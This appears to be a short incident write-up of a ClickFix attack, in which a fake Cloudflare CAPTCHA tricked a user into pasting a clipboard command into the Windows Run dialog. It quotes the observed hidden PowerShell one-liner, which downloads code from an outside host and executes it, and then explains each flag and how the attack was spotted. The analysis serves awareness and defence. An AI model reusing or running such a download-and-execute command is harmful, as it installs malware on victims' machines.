ClickFix Attack — Live Encounter & Analysis

Date: 05 August 2026
Category: Social Engineering / Living-off-the-Land
Outcome: Attack detected and aborted before execution

What Happened:
While visiting a legitimate-looking website (same domain and subdomain as the intended target), a fake Cloudflare Human Verification popup appeared. It instructed the user to:

Press Win+R — opens the Windows Run dialog
Press Ctrl+V — pastes a pre-loaded clipboard payload
Press Enter — executes it

Payload Observed:
powershell -w h "iex(irm 'enter-pverif-code.info/dd6ca753a80a558b' -UseBasicParsing)"; exit

Command Breakdown:
Flag / Function	Purpose
-w h	Runs PowerShell window hidden — no UI indicator
irm (Invoke-RestMethod)	Downloads content from remote URL
iex (Invoke-Expression)	Executes the downloaded content immediately
exit	Closes the process to remove evidence

Payload Host:
enter-pverif-code.info — not affiliated with Cloudflare. 
The hash-like path (dd6ca753a80a558b) suggests per-target or per-session payload delivery, making static blocklists less effective.

Why It Works:
Mimics a trusted UI pattern (Cloudflare CAPTCHA)
Uses native Windows tools (powershell, irm, iex) — no malware download required to stage the attack
Clipboard is pre-poisoned silently on page load — the victim manually pastes and executes their own compromise
Possible payloads: infostealer, keylogger, RAT, ransomware dropper

Detection Point:
The attacker relies on the victim not reading the pasted content. 
Reading the Run dialog before pressing Enter broke the attack chain.

Key Takeaway:
Awareness of what you are executing and why matters more than technical expertise. 
ClickFix specifically exploits the assumption that a CAPTCHA is a trusted interaction.